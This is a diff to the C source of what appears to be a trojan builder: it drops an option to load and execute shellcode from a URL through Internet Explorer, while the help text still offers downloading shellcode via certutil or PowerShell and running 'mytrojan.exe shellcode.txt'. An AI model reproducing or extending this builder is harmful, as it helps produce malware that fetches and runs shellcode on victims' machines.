@@ -18,20 +18,17 @@ int main (int argc, char **argv)
 {
 	print_start();
 	
-	char *evalue = NULL;
-	char *uvalue = NULL;
-	char *wvalue = NULL;
+	char *evalue = NULL;	
 	int hflag = 0;	
 	int Eflag = 0;	
 	char *dvalue = NULL;
-
-	int index;
+	
 	int c;
 
 	opterr = 0;
 
 	// compute the options
-	while ((c = getopt (argc, argv, "e:u:d:w:hE")) != -1)
+	while ((c = getopt (argc, argv, "e:d:hE")) != -1)
 		switch (c)
 		{
 			case 'd':
@@ -39,13 +36,7 @@ int main (int argc, char **argv)
 				break;
 			case 'e':
 				evalue = optarg;
-				break;			
-			case 'u':
-				uvalue = optarg;
-				break;
-			case 'w':
-				wvalue = optarg;
-				break;
+				break;				
 			case 'h':
 				hflag = 1;
 				break;				
@@ -54,13 +45,7 @@ int main (int argc, char **argv)
 				break;				
 			case '?':
 				if (optopt == 'e')
-					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
-				else if (optopt == 'k')
-					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
-				else if (optopt == 'u')
-					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
-				else if (optopt == 'w')
-					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
+					fprintf (stderr, "Option -%c requires an argument.\n", optopt);					
 				else if (isprint (optopt))
 					fprintf (stderr, "Unknown option `-%c'.\n", optopt);
 				else
@@ -72,27 +57,7 @@ int main (int argc, char **argv)
 
 	// print help
 	if (hflag)
-		print_help();	
-	
-	// exec from url
-	else if (uvalue)
-	{
-		printf ("write url %s to defs.h\n", uvalue);
-
-		FILE *file_def;
-		file_def = fopen ("defs.h","w");
-
-		if (file_def == NULL)
-		{
-			printf ("Error open defs.h\n");
-			return -1;
-		}
-
-		fseek (file_def, 0, SEEK_END);
-		fprintf (file_def, "#define UVALUE \"%s\"\n", uvalue);
-
-		fclose (file_def);
-	}
+		print_help();		
 
 	//write flags to defs.h
 	FILE *file_def;
@@ -123,7 +88,6 @@ void print_help()
 {
 	printf("Options:\n");	
 	printf("   when called with -E call with mytrojan.exe shellcode.txt\n");
-	printf("-u load and exec shellcode from url using internet explorer (url is compiled into executable)\n");
 	printf("-d download the shellcode file using different techniques\n");	
 	printf("   -d certutil -> use certutil.exe for downloading the file\n");
 	printf("   -d powershell -> use powershell for downloading the file\n");
